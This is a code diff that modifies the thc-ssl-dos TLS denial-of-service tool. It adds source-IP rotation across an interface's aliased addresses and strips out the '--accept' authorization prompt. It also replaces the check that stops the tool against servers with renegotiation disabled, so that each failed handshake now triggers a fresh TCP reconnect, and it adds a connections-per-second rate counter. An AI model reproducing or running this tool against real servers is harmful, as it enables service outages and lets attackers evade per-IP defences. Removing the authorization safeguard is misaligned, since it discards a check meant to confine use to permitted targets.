@@ -1,9 +1,8 @@
-
 #include "common.h"
 #include <getopt.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
-
+#include <strings.h>
 
 #define MAX_PEERS		(999)
 #define DEFAULT_PEERS		(400)
@@ -19,6 +18,7 @@ struct _statistics
 	uint32_t error_count;
 	uint64_t epoch_start_usec;
 	uint32_t epoch_start_renegotiations;
+	uint32_t current_ssl_connect; //used to count ssl sessions and print em into stdout 
 };
 
 struct _opt
@@ -34,6 +34,7 @@ struct _opt
 	SSL_CTX *ctx;
 	struct _statistics stat;
 	int slowstart_last_peer_idx;
+	char alias_iface[20]; //store OS interface name here. used for for binding to aliased IPs
 };
 #define FL_SECURE_RENEGOTIATION		(0x01)
 #define FL_UNSECURE_RENEGOTIATION	(0x02)
@@ -92,6 +93,13 @@ static void PEER_SSL_renegotiate(struct _peer *p);
 static void PEER_connect(struct _peer *p);
 static void PEER_disconnect(struct _peer *p);
 
+//get network interfaces and it's aliased IP from OS
+#include <ifaddrs.h>
+#include <signal.h>
+static struct ifaddrs *start_ifap; //OS interfaces linked list first entry
+static struct ifaddrs *current_ifap; //OS interfaces linked list current entry
+static _Bool ifap_found = 0;
+
 static char *
 int_ntoa(uint32_t ip)
 {
@@ -124,6 +132,7 @@ init_default(void)
 	g_opt.ip = -1; //inet_addr("127.0.0.1");
 	FD_ZERO(&g_opt.rfds);
 	FD_ZERO(&g_opt.wfds);
+	memset(g_opt.alias_iface, 0, sizeof(g_opt.alias_iface)); // null interface name array
 }
 
 static void
@@ -160,6 +169,7 @@ usage(void)
 "./" PROGRAM_NAME " [options] <ip> <port>\n"
 "  -h      help\n"
 "  -l <n>  Limit parallel connections [default: %d]\n"
+"  -i <interface name>	bind to IPs of this interface\n"
 "", DEFAULT_PEERS);
 	exit(0);
 }
@@ -179,9 +189,8 @@ do_getopt(int argc, char *argv[])
 		{0, 0, 0, 0}
 	};
 	int option_index = 0;
-	
 
-	while ((c = getopt_long(argc, argv, "hl:", long_options, &option_index)) != -1)
+	while ((c = getopt_long(argc, argv, "hl:i:", long_options, &option_index)) != -1)
 	{
 		switch (c)
 		{
@@ -189,6 +198,14 @@ do_getopt(int argc, char *argv[])
 			break;
 		case 'l':
 			g_opt.n_max_peers = atoi(optarg);
+			break;
+		case 'i': // get interface name from command line
+			strncpy(g_opt.alias_iface, (char *) optarg, sizeof(g_opt.alias_iface));
+			if (getifaddrs(&start_ifap) == -1){
+				printf("error: can't get network interfaces\n");
+				exit(1);
+			}
+			current_ifap = start_ifap;
 			break;
 		case 'h':
 		default:
@@ -199,16 +216,6 @@ do_getopt(int argc, char *argv[])
 	if (optind >= argc)
 	{
 		usage();
-	}
-
-	if (accept_flag == 0)
-	{
-		fprintf(stderr, ""
-"ERROR:\n"
-"Please agree by using '--accept' option that the IP is a legitimate target\n"
-"and that you are fully authorized to perform the test against this target.\n"
-"");
-		exit(-1);
 	}
 
 	i = optind;
@@ -225,21 +232,6 @@ do_getopt(int argc, char *argv[])
 
 	if (g_opt.ip == -1)
 		ERREXIT("ERROR: Invalid target IP address\n");
-
-#if 0
-	if (skipdelay_flag == 0)
-	{
-		printf("Waiting for script kiddies to piss off.");
-		fflush(stdout);
-		for (c = 0; c < 15; c++)
-		{
-			sleep(1);
-			printf(".");
-			fflush(stdout);
-		}
-		printf("\nThe force is with those who read the source...\n");
-	}
-#endif
 }
 
 static void
@@ -306,15 +298,9 @@ ssl_handshake_io(struct _peer *p)
 	err = SSL_get_error(p->ssl, ret);
 	if ((err != SSL_ERROR_WANT_READ) && (err != SSL_ERROR_WANT_WRITE))
 	{
-		/* Renegotiation is not supported */
-		if (g_opt.stat.total_renegotiations <= 0)
-		{
-			fprintf(stderr, ""
-"ERROR: Target has disabled renegotiations.\n"
-"Use your own skills to modify the source to test/attack\n"
-"the target [hint: TCP reconnect for every handshake].\n");
-			exit(-1);
-		}
+		/*The most important change.
+		  Close TCP session in case of SSL reconnect error (as thc-ssl-dos developers want me to do)*/
+		PEER_disconnect(p);
 	}
 
 	SSL_set_rw(p, ret);
@@ -330,6 +316,7 @@ ssl_connect_io(struct _peer *p)
 	if (ret == 1)
 	{
 		g_opt.stat.total_ssl_connect++;
+		g_opt.stat.current_ssl_connect++; //increment this counter too. it will be flushed after stat prints to stdout
 #if 1 
 		if (!(g_opt.flags & FL_OUTPUT_SR_ONCE))
 		{
@@ -538,6 +525,43 @@ tcp_connect_try_finish(struct _peer *p, int ret)
 	return 0;
 }
 
+/*used to set src ip for peer.
+ on every tcp connect this functions is invoked (if -i <interface name> passed)
+it walks through linked list of OS interfaces and returns structure containing interface's IP */
+struct sockaddr * get_aliased_sockaddr(char* iface_name){
+	while(1){
+		if (current_ifap->ifa_next == NULL){
+			if (ifap_found == 1){
+				printf("main: all aliased ip of %s has been used, start again\n", iface_name);
+				current_ifap = start_ifap;
+			}else{
+				printf("error: can't find %s interface\n", iface_name);
+				exit(1);
+				}
+		}
+		if (strcmp(iface_name, current_ifap->ifa_name) == 0 && current_ifap->ifa_addr->sa_family==AF_INET){
+			ifap_found = 1;
+			current_ifap = current_ifap->ifa_next;
+			return current_ifap->ifa_addr;
+		}
+		current_ifap = current_ifap->ifa_next;
+	}
+}
+
+/*CTRL^C interceptor.
+disconnect peers and free OS interfaces structure*/
+void gracefull_shutdown(int sig){
+	printf("\nmain: shutdown\n");
+	for (int i = 0; i < g_opt.n_peers; i++)
+	{
+		PEER_disconnect(&peers[i]);
+	}
+	if (*g_opt.alias_iface){
+		freeifaddrs(start_ifap);
+	}
+	exit(0);
+}
+
 int
 tcp_connect(struct _peer *p)
 {
@@ -557,6 +581,10 @@ tcp_connect(struct _peer *p)
 	p->addr.sin_port = g_opt.port;
 	p->addr.sin_addr.s_addr = g_opt.ip;
 
+	//change src IP if -i <interface name> passed
+	if (*g_opt.alias_iface){
+		if (bind(p->sox, get_aliased_sockaddr(g_opt.alias_iface) , sizeof(struct sockaddr)) == -1){printf("error: bind");}
+		}
 	ret = connect(p->sox, (struct sockaddr *)&p->addr, sizeof p->addr);
 	struct timeval tv;
 	gettimeofday(&tv, NULL);
@@ -603,7 +631,7 @@ PEER_disconnect(struct _peer *p)
  		 * Calling SSL_free() without calling SSL_shutdown will
  		 * also remove the session from the session cache.
  		 */
-		SSL_free(p->ssl);
+		SSL_shutdown(p->ssl); // avoid segfault on ubuntu
 		p->ssl = NULL;
 	}
 	if (p->sox >= 0)
@@ -638,34 +666,24 @@ statistics_update(struct timeval *tv)
 		if (peers[i].state > STATE_TCP_CONNECTING)
 			conn++;
 	}
-	printf("Handshakes %" PRIu32" [%.2f h/s], %" PRId32 " Conn, %" PRIu32 " Err\n", g_opt.stat.total_renegotiations, (float)(1000000 * reneg_delta) / usec_delta, conn, g_opt.stat.error_count);
-
+	// print ssl hanshakes per sec
+	float sec_passed = (float) usec_delta / 1000000;
+	float rate = g_opt.stat.current_ssl_connect / sec_passed;
+	printf("rate\t%.2f SSLconn/sec\n", rate);
+	g_opt.stat.current_ssl_connect = 0;
 	g_opt.stat.epoch_start_renegotiations = g_opt.stat.total_renegotiations;
 	g_opt.stat.epoch_start_usec = usec_now;
 }
 
+
 int
 main(int argc, char *argv[])
 {
+	signal(SIGINT, gracefull_shutdown); 
 	int n;
 	int i;
 	fd_set rfds;
 	fd_set wfds;
-
-printf(""
-"     ______________ ___  _________\n"
-"     \\__    ___/   |   \\ \\_   ___ \\\n"
-"       |    | /    ~    \\/    \\  \\/\n"
-"       |    | \\    Y    /\\     \\____\n"
-"       |____|  \\___|_  /  \\______  /\n"
-"                     \\/          \\/\n"
-"            http://www.thc.org\n"
-"\n"
-"          Twitter @hackerschoice\n"
-"\n"
-"Greetingz: the french underground\n"
-"\n");
-	fflush(stdout);
 
 	init_default();
 	do_getopt(argc, argv);
